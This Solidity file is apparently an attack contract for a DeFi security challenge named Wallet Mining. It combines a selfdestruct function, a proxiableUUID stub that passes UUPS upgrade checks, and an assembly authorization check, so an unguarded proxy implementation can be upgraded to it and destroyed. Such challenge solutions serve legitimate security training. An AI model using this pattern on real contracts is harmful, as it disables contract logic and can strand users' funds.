pragma solidity ^0.8.0;
import "hardhat/console.sol";


contract AttackWalletMining {

  function test() public {
    selfdestruct(payable(address(0)));
  }

  function proxiableUUID() external view returns (bytes32) {
    return 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
  }

  // Explanation of GAS code
  // TODO(0xth3g450pt1m1z0r) put some comments
    function can(address u, address a) public view returns (bool) {
        assembly { 
            // AUthorizer Upgrader proxy address (mom)
            let m := sload(0)
            // Ensure m has code
            if iszero(extcodesize(m)) {return(0, 0)}
            // load free memory address at 0x40 into p
            let p := mload(0x40)
            // store p + 0x44 at p to update free memory pointer
            mstore(0x40,add(p,0x44))
            // store at p the sighash for the can function
            mstore(p,shl(0xe0,0x4538c4eb))
            // store at p + 0x04 the imp address
            mstore(add(p,0x04),u)
            // store at p + 0x24 the aim address
            mstore(add(p,0x24),a)
            // Static call the function and check return is > 0
            if iszero(staticcall(gas(),m,p,0x44,p,0x20)) {return(0,0)}
            // Check return data size is NOT zero AND return data is 0 then return false 0
            if and(not(iszero(returndatasize())), iszero(mload(p))) {return(0,0)}
        }
        return true;
    }

}